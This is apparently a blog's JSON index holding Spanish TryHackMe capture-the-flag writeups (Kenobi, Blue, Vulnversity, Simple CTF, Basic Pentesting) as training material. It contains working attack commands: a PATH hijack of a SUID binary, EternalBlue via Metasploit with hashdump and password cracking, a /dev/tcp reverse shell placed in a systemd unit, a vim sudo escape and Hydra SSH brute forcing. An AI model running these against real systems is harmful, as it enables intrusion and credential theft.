9 root root 4096 sep 4 2019 cache drwxrwxrwt 2 root root 4096 sep 4 2019 crash drwxr-xr-x 40 root root 4096 sep 4 2019 lib drwxrwsr-x 2 root staff 4096 abr 12 2016 local lrwxrwxrwx 1 root root 9 sep 4 2019 lock -\u0026gt; /run/lock drwxrwxr-x 10 root tss 4096 sep 4 2019 log drwxrwsr-x 2 root mail 4096 feb 27 2019 mail drwxr-xr-x 2 root root 4096 feb 27 2019 opt lrwxrwxrwx 1 root root 4 sep 4 2019 run -\u0026gt; /run drwxr-xr-x 2 root root 4096 ene 30 2019 snap drwxr-xr-x 5 root root 4096 sep 4 2019 spool drwxrwxrwt 6 root root 4096 ago 27 22:40 tmp drwxr-xr-x 3 root root 4096 sep 4 2019 www paso 6: acceso ssh # me copio la clave privada que esta en /tmp cp id_rsa ~/descargas # le doy permisos sudo chmod 660 id_rsa # me conecto con la clave privada por ssh ssh -i id_rsa kenobi@10.10.107.4 # obtengo la bandera que hay en el home de kenobi kenobi@kenobi:~$ cat user.txt task 4 - privilege escalation con la variable path busco binarios con el bit suid activado. se encuentra el binario /usr/bin/menu que llama la atención sobre el resto. el binario tiene un menu con 3 opciones, cada una ejecuta un comando. ejecutando strings sobre el binario se ve que comandos ejectua: curl -i localhost uname -r ifconfig se modifica path para explotar el permiso de root que tienen los binarios del menu, haciendo una copia de /bin/sh en /tmp con el nombre curl, le asignamos todos los permisos y exportamos el directorio a la variable path. # crear copia de sh en /tmp cd /tmp/ echo /bin/sh \u0026gt; curl # dar permisos chmod 777 curl # exportar a variable path export path=/tmp:$path # explotar uso de menu para obtener root /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** enter your choice :1 # whoami root # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) conclusion con kenobi acabamos el bloque introductorio de “offensive pentesting”. es una sala muy sencilla, pero es divertida, sobretodo siendo temática de star wars. a partir de ahora se empezará a jugar con máquinas más complejas, por lo que la confianza ganada hasta aquí también considero que es importante subrayar.\n(◕‿‿◕) hack the planet! ","title":"Kenobi [TryHackMe]"},{"date":"2023-08-27","image":"/images/post_pics/blue/blue.png","link":"https://k3ssdev.github.io/posts/blue/","summary":"Introducción Se trata de la segunda máquina de la serie \u0026ldquo;Offensive Pentesting\u0026rdquo; de TryHackMe, que se centra en la explotación de la vulnerabilidad EternalBlue en sistemas Windows. Es una sala sencilla, destinada a familiarizarse con el reconocimiento, la explotación y el escalamiento de privilegios en sistemas Windows y en uso de Metasploit y Meterpreter.","tags":["“Meterpreter”","“Reverse Shell”","“Windows\"","Easy","Enumeration","Metasploit","Password Attacks","Privilege Escalation","Privilege Escalation","TryHackMe","Vulnerability Exploitation"],"text":"introducción se trata de la segunda máquina de la serie \u0026ldquo;offensive pentesting\u0026rdquo; de tryhackme, que se centra en la explotación de la vulnerabilidad eternalblue en sistemas windows. es una sala sencilla, destinada a familiarizarse con el reconocimiento, la explotación y el escalamiento de privilegios en sistemas windows y en uso de metasploit y meterpreter.\ntask 1 - reconocimiento paso 1: enumeración de puertos realizo un escaneo de puertos con nmap para identificar los puertos abiertos. descubro que el puerto 445 (smb) estaba abierto en el objetivo. encuentro una vulnerabilidad conocida en el servicio smb, ms17-010. comando nmap:\nnmap -sv --script vuln -p- 10.10.185.150 task 2 - explotación paso 2: identificación de vulnerabilidad investigo sobre la vulnerabilidad ms17-010 y su explotación potencial. busco el módulo \u0026ldquo;ms17_010_eternalblue\u0026rdquo; de metasploit y lo selecciono. herramienta metasploit:\nuse windows/smb/ms17_010_eternalblue paso 3: explotación configuro metasploit con mi dirección ip como host. ejecuto el exploit para obtener acceso en el sistema objetivo. consigo una shell inversa y la con meterpreter. comandos metasploit:\nset rhosts 10.10.185.150 set lhost \u0026lt;mi dirección ip\u0026gt; exploit task 3 - escalamiento de privilegios paso 4: escalamiento de privilegios busco la manera de escalar privilegios y convertir la shell en una sesión de meterpreter. utilizo el módulo \u0026ldquo;shell_to_meterpreter\u0026rdquo; de metasploit para lograrlo. comandos metasploit:\nuse post/multi/manage/shell_to_meterpreter sessions set session \u0026lt;número de sesión\u0026gt; exploit task 4 - descifrando contraseñas paso 5: extracción de contraseñas con meterpreter, ejecuto el comando \u0026ldquo;hashdump\u0026rdquo; para extraer las contraseñas almacenadas en el sistema. comando meterpreter:\nhashdump paso 6: descifrando contraseña copio el hash de contraseña de un usuario no predeterminado y utilizo john the ripper para descifrarlo. la contraseña descifrada resultante es \u0026ldquo;alqfna22\u0026rdquo;. comandos john the ripper:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashdump.txt --format=nt task 5 - búsqueda de banderas paso 7: búsqueda de banderas utilizo el comando \u0026ldquo;search\u0026rdquo; en meterpreter para encontrar las ubicaciones de las banderas en el sistema. descubro las siguientes banderas: c:\\\\flag1.txt (ubicada en la raíz del sistema) c:\\\\windows\\\\system32\\\\config\\\\flag2.txt (ubicada en la carpeta de configuración) c:\\\\users\\\\jon\\\\documents\\\\flag3.txt (ubicada en la carpeta de documentos de un usuario) comando meterpreter:\nsearch -f flag*.txt paso 8: exploración de banderas uso \u0026ldquo;cat\u0026rdquo; para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas de la sala: comando meterpreter:\ncat c:\\\\flag1.txt conclusión se trata de una máquina muy sencilla, ya que se cubren los aspectos clave de la enumeración, la explotación de vulnerabilidades, el escalamiento de privilegios, la extracción y el descifrado de contraseñas, y la búsqueda de ficheros en sistemas windows.\n(◕‿‿◕) hack the planet! ","title":"Blue [TryHackMe]"},{"date":"2023-08-26","image":"/images/post_pics/vulnversity/vulnversity.png","link":"https://k3ssdev.github.io/posts/vulnversity/","summary":"Introducción Vulnversity es la primera máquina a vulnerar del learning path “Offensive Pentesting” de TryHackMe. Es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “Jr Penetration Tester”. El objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.","tags":["Burp Suite","Directory Enumeration","Easy","File Upload Vulnerability","Gobuster","Linux","Privilege escalation","Reverse Shell","SUID","TryHackMe"],"text":"introducción vulnversity es la primera máquina a vulnerar del learning path “offensive pentesting” de tryhackme. es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “jr penetration tester”. el objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.\nrecopilación de información (reconocimiento) comienzo con un escaneo de puertos utilizando nmap para enumerar los servicios en la máquina:\nnmap -ss -p- -t4 -on nmap_scan 10.10.71.251 los resultados muestran varios puertos abiertos, incluidos el 21 (ftp), 22 (ssh), 139 (netbios-ssn), 445 (microsoft-ds), 3128 (squid http proxy) y 3333 (http).\nenumeración web escaneo de directorios con gobuster hago un escaneo de directorios en el servidor web que se ejecuta en el puerto 3333. uso gobuster con la lista de directorios predeterminada:\ngobuster dir -u http://10.10.71.251:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt el escaneo encuentra un directorio llamado /internal.\nexplotación de la vulnerabilidad mi siguiente paso es intentar subir un archivo php como shell inversa, pero me encuentro con restricciones en la extensión del archivo. preparo una lista de extensiones php y uso burp suite para realizar un ataque \u0026ldquo;sniper\u0026rdquo; desde el módulo repeater.\nreviso los resultados de repeater y compruebo que la extensión .phtml permite eludir la comprobación de extensiones de archivos. subo un archivo llamado revere-shell.phtml que contiene el código para ejecutar una shell inversa.\nobtención de acceso para obtener acceso, abro un listener con netcat:\nnc -lvnp 1234 luego, para estabilizar la shell y mejorar su funcionalidad, ejecuté el comando:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; además, configuro la variable de entorno term para xterm con:\nexport term=xterm de esta forma, puedo usar comandos como clear y ctrl + c en la shell.\nescalada de privilegios enumeración de usuarios mientras exploro el sistema vulnerado, encuentro un usuario llamado \u0026ldquo;bill\u0026rdquo; en el directorio /home.\nbúsqueda de binarios suid luego, usando el comando find, me pongo a buscar binarios con el bit suid y sgid habilitados:\nfind / -type f -perm -u=s -o -type f -perm -g=s 2\u0026gt;/dev/null me llama la atención el binario /bin/systemctl, que tiene el bit suid habilitado.\nescalada de privilegios con systemctl investigo /bin/systemctl en gtfobins y encuentro una forma de escalada de privilegios para systemctl . el ejemplo de gtfobins es el siguiente:\ntf=$(mktemp).service echo \u0026#39;[service] type=oneshot execstart=/bin/bash -c \u0026#34;id \u0026gt; /tmp/output\u0026#34; [install] wantedby=multi-user.target\u0026#39; \u0026gt; $tf obtención de una shell de root para obtener una shell de root, modifico el archivo de servicio temporal (*.service) vinculado a /bin/systemctl para ejecutar un shell inverso como root. aquí está la configuración del archivo de servicio:\n[service] type=oneshot execstart=/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.14.50.184/4444 0\u0026gt;\u0026amp;1\u0026#34; [install] wantedby=multi-user.target reinicio el servicio temporal:\n/bin/systemctl systemctl link $tf en mi máquina local, configuro un listener en el puerto 4444:\nnc -lvnp 4444 y por ultimo activo el servicio temporal para que se ejecute ahora:\n/bin/systemctl enable $tf --now una vez reiniciado el servicio temporal en la máquina objetivo, obtengo una shell de root en mi máquina.\nconclusión vulnversity es una máquina idónea para principiantes, ya que permite practicar y aplicar conceptos fundamentales que serán muy útiles en posteriores máquinas del learning path “offensive pentesting”:\nenumeración de servicios y puertos mediante herramientas como nmap. escaneo de directorios en un servidor web utilizando gobuster. explotación de vulnerabilidades, como restricciones en la extensión de archivos, para cargar archivos maliciosos. obtención de acceso a través de una shell inversa y mejora de la funcionalidad de la shell. escalada de privilegios mediante la identificación de binarios suid y sgid. uso de gtfobins para abusar de binarios con permisos elevados. (◕‿‿◕) hack the planet! ","title":"Vulnversity [TryHackMe]"},{"date":"2023-03-22","image":"/images/post_pics/back/mr-robot-hello.gif","link":"https://k3ssdev.github.io/posts/back/","summary":"Vuelta al tajo.. Después de varios meses de abandono, hago el intento de retomar esto. He estado bastante ocupado estudiando para los exámenes de primer semestre del CFGS de Desarrollo de Aplicaciones Multiplataforma, así que no he tenido más remedio que pausar algunas cosas\u0026hellip; Pero ya estoy de vuelta y con ganas de seguir aprendiendo y compartiendo.","tags":["personal"],"text":"vuelta al tajo.. después de varios meses de abandono, hago el intento de retomar esto. he estado bastante ocupado estudiando para los exámenes de primer semestre del cfgs de desarrollo de aplicaciones multiplataforma, así que no he tenido más remedio que pausar algunas cosas\u0026hellip; pero ya estoy de vuelta y con ganas de seguir aprendiendo y compartiendo. la idea es marcarme un objetivo de publicar al menos una entrada al mes, aunque no prometo nada. poco a poco iré retomando el ritmo, y no solo con el blog, sino también con las máquinas de tryhackme, que también las tengo un poco abandonadas.\n(◕‿‿◕) hack the planet! ","title":"I'm back"},{"date":"2022-11-08","image":"/images/post_pics/simple-ctf/simple_ctf_intro.png","link":"https://k3ssdev.github.io/posts/simple_ctf/","summary":"Seguimos con los writeups de TryHackMe. Hoy le toca el turno a una sala fácil pensada tambien para principiantes llamada Simple CTF. En esta máquina hay que conseguir dos banderas para completarla. Vamos allá.\nEnumeración El primer paso que hay que dar en toda prueba de penetración es el de enumeración.","tags":["CTF","easy","hacking","Linux","tryhackme","Tryhackme","writeup"],"text":"seguimos con los writeups de tryhackme. hoy le toca el turno a una sala fácil pensada tambien para principiantes llamada simple ctf. en esta máquina hay que conseguir dos banderas para completarla. vamos allá.\nenumeración el primer paso que hay que dar en toda prueba de penetración es el de enumeración. la habitación de tryhackme nos hace unas primeras preguntas relacionadas con este paso, que son:\n¿cuantos servicios están funcionando en el puerto 1000? ¿cual es el servicio del puerto más alto? para resolver estas dos preguntas, empezamos con un escaneo de puertos usando nmap.\n┌──(alberto㉿kali)-[~/descargas] └─$ sudo nmap -n -pn -sc -sv -t4 -open 10.10.91.117 starting nmap 7.93 ( https://nmap.org ) at 2022-10-15 20:54 cest nmap scan report for 10.10.91.117 host is up (0.037s latency). not shown: 997 filtered tcp ports (no-response) some closed ports may be reported as filtered due to --defeat-rst-ratelimit port state service version 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | stat: | ftp server status: | connected to ::ffff:10.18.112.125 | logged in as ftp | type: ascii | no session bandwidth limit | session timeout in seconds is 300 | control connection is plain text | data connections will be plain text | at session startup, client count was 1 | vsftpd 3.0.3 - secure, fast, stable |_end of status | ftp-anon: anonymous ftp login allowed (ftp code 230) |_can\u0026#39;t get directory listing: timeout 80/tcp open http apache httpd 2.4.18 ((ubuntu)) |_http-title: apache2 ubuntu default page: it works |_http-server-header: apache/2.4.18 (ubuntu) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 2222/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.8 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 2048 294269149ecad917988c27723acda923 (rsa) | 256 9bd165075108006198de95ed3ae3811c (ecdsa) |_ 256 12651b61cf4de575fef4e8d46e102af6 (ed25519) service info: oss: unix, linux; cpe: cpe:/o:linux:linux_kernel service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 44.36 seconds estas son las opciones que uso en nmap:\n-n #sin resolución de dns, más rápido -sc #es equivalente a --script=default -sv* #detección de versión -t4 #establecer una plantilla de tiempo #si tiene una conexión ethernet o de banda ancha decente, recomendaría usar siempre -t4 tras el escaneo, podemos contestar a las dos preguntas que nos hace la sala.\nanálisis de vulnerabilidades en esta fase vamos a analizar las vulnerabilidades que puede tener la máquina. usando los datos recogidos durante la fase de enumeración, podremos comprobar si hay alguna vulnerabilidad conocida que podamos aprovechar.\nen este caso hay una mala configuración de seguyridad, parece que han dejado la puerta abierta en el servidor fpt para que se conecten usuarios anónimos:\nftp-anon: anonymous ftp login allowed (ftp code 230)* bien, ahora toca revisar la web que tienen en el puerto 80 con el servidor apache. voy a usar la herramienta gobuster para enumerar las posibles páginas y directorios que tenga la web.\n┌──(alberto㉿kali)-[~/descargas] └─$ gobuster dir -u http://10.10.91.117/ -w /usr/share/wordlists/dirb/common.txt =============================================================== gobuster v3.2.0-dev by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.10.91.117/ [+] method: get [+] threads: 10 [+] wordlist: /usr/share/wordlists/dirb/common.txt [+] negative status codes: 404 [+] user agent: gobuster/3.2.0-dev [+] timeout: 10s =============================================================== 2022/10/15 21:09:57 starting gobuster in directory enumeration mode =============================================================== /.hta (status: 403) [size: 291] /.htaccess (status: 403) [size: 296] /.htpasswd (status: 403) [size: 296] /index.html (status: 200) [size: 11321] /robots.txt (status: 200) [size: 929] /server-status (status: 403) [size: 300] /simple (status: 301) [size: 313] [--\u0026gt; http://10.10.91.117/simple/] progress: 4609 / 4615 (99.87%)=============================================================== 2022/10/15 21:10:16 finished =============================================================== además, compruebo si tiene el fichero robots.txt, que parece ser que el listado que usado para enumerar las paginas no tenia ese termino guardado.\n# # \u0026#34;$id: robots.txt 3494 2003-03-19 15:37:44z mike $\u0026#34; # # this file tells search engines not to index your cups server. # # copyright 1993-2003 by easy software products. # # these coded instructions, statements, and computer programs are the # property of easy software products and are protected by federal # copyright law. distribution and use rights are outlined in the file # \u0026#34;license.txt\u0026#34; which should have been included with this file. if this # file is missing or damaged please contact easy software products # at: # # attn: cups licensing information # easy software products # 44141 airport view drive, suite 204 # hollywood, maryland 20636-3111 usa # # voice: (301) 373-9600 # email: cups-info@cups.org # www: http://www.cups.org # user-agent: * disallow: / disallow: /openemr-5_0_1_3 # # end of \u0026#34;$id: robots.txt 3494 2003-03-19 15:37:44z mike $\u0026#34;. entro en la dirección encontrada y veo que tienen un cms llamado cms made simple (version 2.2.8).\nhago una busqueda rápida para ver que vulnerabilidades puede tener.\nhttps://www.exploit-db.com/exploits/46635\ncve-2019-9053 es una vulnerabilidad de tipo sql injection. en el script que descargo vienen unas intrucciones:\n[+] example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist\u0026#34; aquí acaba la fase de recopilación de información, en principio\u0026hellip;\nexplotación vamos a aprovecharnos de la mala configuración del servidor ftp para acceder y husmear un poco, por si hubiese algo de utilidad.\n┌──(alberto㉿kali)-[~/descargas] └─$ ftp 10.10.91.117 connected to 10.10.91.117. 220 (vsftpd 3.0.3) name (10.10.91.117:alberto): anonymous 230 login successful. remote system type is unix. using binary mode to transfer files. ftp\u0026gt; ls 229 entering extended passive mode (|||47009|) ftp: can\u0026#39;t connect to `10.10.91.117:47009\u0026#39;: expiró el tiempo de conexión 200 eprt command successful. consider using epsv. 150 here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 aug 17 2019 pub 226 directory send ok. ftp\u0026gt; cd pub 250 directory successfully changed. ftp\u0026gt; ls 200 eprt command successful. consider using epsv. 150 here comes the directory listing. -rw-r--r-- 1 ftp ftp 166 aug 17 2019 formitch.txt 226 directory send ok. ftp\u0026gt; get formitch.txt local: formitch.txt remote: formitch.txt 200 eprt command successful. consider using epsv. 150 opening binary mode data connection for formitch.txt (166 bytes). 100% |***************************************************************************************************************************** ********************************************************************| 166 4.52 mib/s 00:00 eta 226 transfer complete. 166 bytes received in 00:00 (4.43 kib/s) ftp\u0026gt; exit 221 goodbye. ┌──(alberto㉿kali)-[~/descargas] └─$ cat formitch.txt dammit man... you\u0026#39;te the worst dev i\u0026#39;ve seen. you set the same pass for the system user, and the password is so weak... i cracked it in seconds. gosh... what a mess! vale ahora tenemos un usuario vulnerable, mitch, que tiene una contraseña débil. necesitamos conseguir la contraseña, para ello hay que usar el script de cve-2019-9053. lo ejecuto contra la máquina y le paso una wordlist para intentar crackear la contraseña.\n└─$ python3 cve-2019-9053-python3.py -u http://10.10.60.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt [+] salt for password found: 1dac0d92e9fa6bb2 [+] username found: mitch [+] email found: admin@admin.com [*] try: 0c01f4468bd75d7a84c7eb73846e8d96$ [*] now try to crack password traceback (most recent call last): file \u0026#34;/home/alberto/descargas/cve-2019-9053-python3.py\u0026#34;, line 184, in \u0026lt;module\u0026gt; crack_password() file \u0026#34;/home/alberto/descargas/cve-2019-9053-python3.py\u0026#34;, line 53, in crack_password for line in dict.readlines(): file \u0026#34;/home/alberto/.pyenv/versions/3.10.7/lib/python3.10/codecs.py\u0026#34;, line 322, in decode (result, consumed) = self._buffer_decode(data, self.errors, final) unicodedecodeerror: \u0026#39;utf-8\u0026#39; codec can\u0026#39;t decode byte 0xf1 in position 933: invalid continuation byte parece que el script da algun problema al ejecutarlo con python 3.8, que es el que tengo. estos son los datos que ha podido obtener de momento:\n[+] username found: mitch [+] email found: admin@admin.com [*] try: 0c01f4468bd75d7a84c7eb73846e8d96$ para no perder mas tiempo en arreglar el script para que sea compatible, o buscar la manera de ejecutarlo con python2, voy a hacer un ataque de fuerza bruta contra el servicio ssh usando el usuario que hemos encontrado, ya que la contraseña parece ser muy sencilla. para hacerlo, voy a usar la herramienta hydra.\n┌──(alberto㉿kali)-[~/descargas] └─$ hydra -l mitch -p /usr/share/wordlists/rockyou.txt ssh://10.10.60.189:2222 hydra v9.3 (c) 2022 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-16 00:03:20 [warning] many ssh configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [warning] restorefile (you have 10 seconds to abort... (use option -i to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [data] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [data] attacking ssh://10.10.60.189:2222/ [2222][ssh] host: 10.10.60.189 login: mitch password: secret 1 of 1 target successfully completed, 1 valid password found [warning] writing restore file because 1 final worker threads did not complete until end. [error] 1 target did not resolve or could not be connected [error] 0 target did not complete hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-16 00:03:38 ya tenemos la contraseña, era muy insegura. ahora puedo entrar en el equipo por ssh y obtener la primera bandera.\n┌──(alberto㉿kali)-[~/descargas] └─$ ssh mitch@10.10.60.189 -p 2222 the authenticity of host \u0026#39;[10.10.60.189]:2222 ([10.10.60.189]:2222)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:iq4f0xcna5nnpnaufeqopvtbo8dojpchggmeabedq5g. this key is not known by any other names are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;[10.10.60.189]:2222\u0026#39; (ed25519) to the list of known hosts. mitch@10.10.60.189\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.15.0-58-generic i686) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. last login: mon aug 19 18:13:41 2019 from 192.168.0.190 $ whoami mitch $ ls user.txt $ cat us\tcat: us: no such file or directory $ cat user.txt g00d j0b, keep up! $ por último, hay que buscar la manera de escalar privilegios. una de las formas mas rápidas es buscar algún binario que nos permita usarlo para hacer un bypass a las restricciones de seguridad del sistema. en la página de gtfobins busco el binario del vim, que ya lo he usado antes en otras máquinas, y compruebo que esté instalado en el sistema que estoy atacando.\nhttps://gtfobins.github.io/gtfobins/vim/#sudo\nestos son los métodos que hay para vim:\n#sudo #if the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo vim -c \u0026#39;:!/bin/sh\u0026#39; #this requires that vim is compiled with python support. prepend :py3 for python 3. sudo vim -c \u0026#39;:py import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;reset; exec sh\u0026#34;)\u0026#39; #this requires that vim is compiled with lua support. sudo vim -c \u0026#39;:lua os.execute(\u0026#34;reset; exec sh\u0026#34;)\u0026#39; y por suerte, la máquina objetivo lo tiene:\n$ type vim vim is a tracked alias for /usr/bin/vim ejecuto el primer método y obtengo acceso al usuario root.\n$sudo vim -c \u0026#39;:!/bin/sh\u0026#39; # whoami root # cd root\t# ls root.txt # cat root.txt w3ll d0n3. you made it! # con este último paso hemos completado la sala. fácil, sencilla y en cómodos pasos.\n(◕‿‿◕) hack the planet! ","title":"Simple CTF [TryHackMe]"},{"date":"2022-10-12","image":"/images/post_pics/basic-pentesting/moMbBki.png","link":"https://k3ssdev.github.io/posts/basic-pentesting/","summary":"Basic Pentesting - TryHackMe \u0026gt; Hoy traigo unos apuntes que me he hecho para una máquina fácil de TryHackMe. En ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. A continuación dejo el enlace de THM:","tags":["CTF","easy","hacking","Linux","tryhackme","Tryhackme","writeup"],"text":"basic pentesting - tryhackme \u0026gt; hoy traigo unos apuntes que me he hecho para una máquina fácil de tryhackme. en ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. a continuación dejo el enlace de thm:\nbasic pentesting\nsegún dice la introducción de la sala, estos son los conceptos que se van a aprender con ésta máquina:\nbrute forcing hash cracking service enumeration linux enumeration se puede usar al \u0026ldquo;attackbox\u0026rdquo; de tryhackme o, como es mi caso, conectarse por vpn y atacar con mi propia máquina.\n¡así que vamos a ello!\nreconocimiento el primer paso es iniciar la máquina vulnerable y esperar a que nos de la dirección ip. una vez la tenemos, un simple ping nos ayudará a estar seguros de que estamos en la misma red y vemos a la máquina objetivo. en mi caso, me ha dado la ip 10.10.59.211 y con el ping compruebo que veo al objetivo.\nejecuto un reconocimiento de puertos usando nmap. en esta máquina no importa hacer algo de ruido, asi que uso las opciones -sc (\u0026ndash;script=default) y \u0026ndash;open (mostrar solo puertos abiertos):\n┌──(alberto㉿kali)-[~/descargas] └─$ nmap -sc --open 10.10.59.211 starting nmap 7.93 ( https://nmap.org ) at 2022-10-12 15:48 cest nmap scan report for 10.10.59.211 host is up (0.038s latency). not shown: 994 closed tcp ports (conn-refused) port state service 22/tcp open ssh | ssh-hostkey: | 2048 db45cbbe4a8b71f8e93142aefff845e4 (rsa) | 256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ecdsa) |_ 256 a5682b225f984a62213da2e2c5a9f7c2 (ed25519) 80/tcp open http |_http-title: site doesn\u0026#39;t have a title (text/html). 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8009/tcp open ajp13 | ajp-methods: |_ supported methods: get head post options 8080/tcp open http-proxy |_http-favicon: apache tomcat |_http-title: apache tomcat/9.0.7 host script results: | smb-os-discovery: | os: windows 6.1 (samba 4.3.11-ubuntu) | computer name: basic2 | netbios computer name: basic2\\x00 | domain name: \\x00 | fqdn: basic2 |_ system time: 2022-10-12t09:48:31-04:00 |_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ message signing enabled but not required |_nbstat: netbios name: basic2, netbios user: \u0026lt;unknown\u0026gt;, netbios mac: 000000000000 (xerox) | smb2-time: | date: 2022-10-12t13:48:31 |_ start_date: n/a nmap done: 1 ip address (1 host up) scanned in 31.92 seconds en el escaneo de puertos ya vemos algunas cosas interesantes:\ntiene el puerto 22 abierto para un servicio ssh. en el puerto 80 tiene un servidor apache. tiene un servicio smb en el puerto 445 vamos a empezar por el vector más obvio, el servidor web. asi que pongo la ip en la barra de direcciones del navegador y miro lo que hay.\nla página está en construcción, pero podría haber más páginas colgadas que ahora mismo no podemos ver. es en este momento cuando uso la herramienta gobuster para intentar descubrir si hay algo.\n┌──(alberto㉿kali)-[~] └─$ gobuster dir -u http://10.10.59.211/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt =============================================================== gobuster v3.2.0-dev by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.10.59.211/ [+] method: get [+] threads: 10 [+] wordlist: /usr/share/wordlists/dirbuster/directory-list-1.0.txt [+] negative status codes: 404 [+] user agent: gobuster/3.2.0-dev [+] timeout: 10s =============================================================== 2022/10/12 16:13:01 starting gobuster in directory enumeration mode =============================================================== /development (status: 301) [size: 318] [--\u0026gt; http://10.10.59.211/development/] progress: 9638 / 141709 (6.80%)^c [!] keyboard interrupt detected, terminating. =============================================================== 2022/10/12 16:13:41 finished gobuster va probando una lista de palabras detrás de la dirección que he indicado, y dependiendo del mensaje http que reciba, marca la dirección como coincidencia positiva o negativa. en este caso, parece que hay una pagína de devolopment colgada, así que pruebo a acceder a ella.\nen estos ficheros veo que han configurado un servicio smb y que hay dos desarrolladores, uno llamado j y otro llamado k, que se intercambian mensajes. al parecer, k deja un mensaje a j sobre que la contraseña que ha puesto a su usario es muy débil y no cumple con las reglas de seguridad de la empresa. esto es importante, ¡ya sabemos que necesitamos conseguir el usuario de j!\nbien, pues ahora toca hacer una enumeración del servicio smb usando la herramienta enum4linux para conseguir el usuario de j.\n┌──(alberto㉿kali)-[~] └─$ enum4linux 10.10.59.211 starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on wed oct 12 16:22:02 2022 =========================================( target information )========================================= target ........... 10.10.59.211 rid range ........ 500-550,1000-1050 username ......... \u0026#39;\u0026#39; password ......... \u0026#39;\u0026#39; known usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ============================( enumerating workgroup/domain on 10.10.59.211 )============================ [+] got domain/workgroup name: workgroup ================================( nbtstat information for 10.10.59.211 )================================ looking up status of 10.10.59.211 basic2 \u0026lt;00\u0026gt; - b \u0026lt;active\u0026gt; workstation service basic2 \u0026lt;03\u0026gt; - b \u0026lt;active\u0026gt; messenger service basic2 \u0026lt;20\u0026gt; - b \u0026lt;active\u0026gt; file server service ..__msbrowse__. \u0026lt;01\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; master browser workgroup \u0026lt;00\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; domain/workgroup name workgroup \u0026lt;1d\u0026gt; - b \u0026lt;active\u0026gt; master browser workgroup \u0026lt;1e\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; browser service elections ... el informe que nos muestra enum4linux es bastante completo y largo. tras revisarlo, me quedo con estos datos:\nel equipo se llama basic2 están compartiendo la carpeta //10.10.59.211/anonymous sin seguridad hay dos usuarios, kay y jan ataque de fuerza bruta contra ssh ahora ya tengo un usuario (jan) para poder realizar mi ataque de fuerza bruta contra el objetivo e intentar tener acceso remoto mediante ssh. para poder hacerlo, voy a usar la herramienta hydra y una wordlist para que pruebe contraseñas con el usuario jan. depende de lo larga que sea la lista, el ataque durará más o menos. en mi caso le llevó algunos minutos, asi que sed pacientes. paciencia\u0026hellip;.\n┌──(alberto㉿kali)-[~] └─$ hydra -l jan -p descargas/rockyou.txt 10.10.59.211 ssh hydra v9.3 (c) 2022 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-12 16:43:07 [warning] many ssh configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [warning] restorefile (you have 10 seconds to abort... (use option -i to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [data] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [data] attacking ssh://10.10.59.211:22/ [status] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active [status] 128.00 tries/min, 384 tries in 00:03h, 14344015 to do in 